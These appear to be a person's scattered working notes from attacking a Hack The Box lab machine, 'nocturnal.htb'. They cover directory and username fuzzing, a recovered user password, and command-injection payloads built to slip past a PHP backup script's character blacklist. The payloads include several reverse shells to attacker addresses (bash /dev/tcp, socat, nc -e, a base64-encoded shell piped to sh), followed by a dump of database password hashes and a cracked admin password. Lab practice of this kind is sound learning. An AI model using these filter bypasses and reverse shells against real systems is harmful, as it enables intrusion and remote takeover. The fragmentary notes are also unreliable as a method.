___


# get uploaded file
GET /view.php?username=test&file=test.pdf HTTP/1.1
Host: nocturnal.htb


# upload file

POST /dashboard.php HTTP/1.1
Host: nocturnal.htb



# ferox output

 🎯  Target Url            │ http://nocturnal.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/ew/Documents/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      161l      327w     3105c http://nocturnal.htb/style.css
200      GET       21l       45w      644c http://nocturnal.htb/login.php
200      GET       21l       45w      649c http://nocturnal.htb/register.php
200      GET       29l      145w     1524c http://nocturnal.htb/
403      GET        7l       10w      162c http://nocturnal.htb/uploads
301      GET        7l       12w      178c http://nocturnal.htb/backups => http://nocturnal.htb/backups/
403      GET        7l       10w      162c http://nocturnal.htb/uploads_admin
403      GET        7l       10w      162c http://nocturnal.htb/uploads_user
403      GET        7l       10w      162c http://nocturnal.htb/uploads_group
403      GET        7l       10w      162c http://nocturnal.htb/uploads2
403      GET        7l       10w      162c http://nocturnal.htb/uploads_video
403      GET        7l       10w      162c http://nocturnal.htb/uploads_forum
403      GET        7l       10w      162c http://nocturnal.htb/uploads_event
403      GET        7l       10w      162c http://nocturnal.htb/uploads3
403      GET        7l       10w      162c http://nocturnal.htb/uploads4
403      GET        7l       10w      162c http://nocturnal.htb/uploads6
403      GET        7l       10w      162c http://nocturnal.htb/uploads_files
403      GET        7l       10w      162c http://nocturnal.htb/uploads7
403      GET        7l       10w      162c http://nocturnal.htb/uploads5
403      GET        7l       10w      162c http://nocturnal.htb/uploads_game
403      GET        7l       10w      162c http://nocturnal.htb/uploads_vid
[####################] - 3m    124567/124567  0s      found:21      errors:1      
[####################] - 3m     62282/62282   383/s   http://nocturnal.htb/ 
[####################] - 3m     62282/62282   386/s   http://nocturnal.htb/backups/               


# regex filter



- regex filter is getting rid of the beggining of file name with /  and \ 

payload.php%00.jpg OR payload.php\x00.jpg



payload.php.doc

this works but file is still not being executed as php


# fuzz the usernames parameter

make sure to add the cookie in the requests


ffuf -w /home/ew/Documents/wordlists/wordlist/usernames.txt -u 'http://nocturnal.htb/view.php?username=FUZZ&file=test.doc' -b "PHPSESSID=v6qr9bueer8m3cdpv1odh36gvb"  -fs 2985  

needed cookie to fuzz


amanda user was found 


# amanda pass: (has access to admin panel)

# arHkG7HAI68X8s1J

9
uploading files POSTS to dashboard.php

view.php GET request for downloading files associated with user


$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile



1234"%09"backups/cool.zip"%09../nocturnal_database%09>%09/tmp/cool_backup#




1234"shellCMDHERE

1234"%09backups/backup_2025_05_11.zip%09..%09#

1234"%09mkfifo%09/tmp/f

1234"%09cat%09/tmp/f%09


1234"%09busybox%09nc%09-l%09-p%094444%09-e%09/bin/sh




1234"socat%09TCP:10.10.14.25:443%09EXEC:sh



1234"%09/bin/bash%09-i%09>&%09/dev/tcp/10.10.14.23/4444%090>&1

1234"%09/bin/bash%09-i%09>%09/dev/tcp/10.10.14.23/4444%090>1


# this but I get that my ip is refusing the connection???
1234"%09busybox%09nc%0910.10.14.25%094444%09-e%09/bin/bash








       On ‘server’ side:

             $ rm -f /tmp/f; mkfifo /tmp/f
             $ cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f

       On ‘client’ side:

             $ nc host.example.com 1234
             $ (shell prompt from host.example.com)
 


# this is cleaning/filtering entries
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}


"test%09cool%09../nocturnal_database/nocturnal_database.db%09#//






# this worked !!!!!!!!!!

1234"zip%09-r%09backups/cool.zip%09../nocturnal_database/%09



port 8080 on the machine is running ispconfig web portal


# grabbed db with hashes

sqlite> select * from users;
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
6|kavi|f38cde1654b39fea2bd4f72f1ae4cdda
7|e0Al5|101ad4543a96a7fd84908fd0d802e7db

slowmotionapocalypse
slowmotionapocalypse
slowmotionapocalypse
slowmotionapocalypse


# port forwarding ispconfig

ssh -L 8080:localhost:8080 tobias@nocturnal

this makes port 8080 on remote host accesible on my machine


creds for ispconfig were:
admin
slowmotionapocalypse




zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile

%09 - not working as space
test"	cool	../nocturnal_database/nocturnal_database.db	#//
test"	cool	../nocturnal_database/nocturnal_database.db	#//

# these made things happen

zip -x './backups/*' -r -P pass coolBak ..nocturnal_database/nocturnal_database.db  > " . $logFile . " 2>&1 &";


if u do a backup and pass a password parameter eventually that gets passed into a shell


<?php
if (isset($_POST['backup']) && !empty($_POST['password'])) {
    $password = cleanEntry($_POST['password']);
    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

    if ($password === false) {
        echo "<div class='error-message'>Error: Try another password.</div>";
    } else {
        $logFile = '/tmp/backup_' . uniqid() . '.log';
       
        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";


# $password


$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";

bash zip -x ./backups/* -r -P ()





```powershell
original_cmd_by_server; ls
original_cmd_by_server && ls
original_cmd_by_server | ls
original_cmd_by_server || ls   # Only if the first cmd fail
```

|| ls

# this cleans it

function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}




either bypass backup blacklist filter
either bypass view.php basename() for dir traversal


$db = new SQLite3('../nocturnal_database/nocturnal_database.db');
$user_id = $_SESSION['user_id'];
$username = $_SESSION['username'];



%0abash "sh -i >& /dev/tcp/10.10.14.25/443 0>&1"

/bin/echo -e


bash -c "sh -i >& /dev/tcp/10.10.14.25/443 0>&1"

YmFzaCAtYyAic2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjUvNDQzIDA+JjEiCg==


base64 -D <<< YmFzaCAtYyAic2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjUvNDQzIDA+JjEiCg== | sh




../nocturnal_database/nocturnal_database.db




function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}

































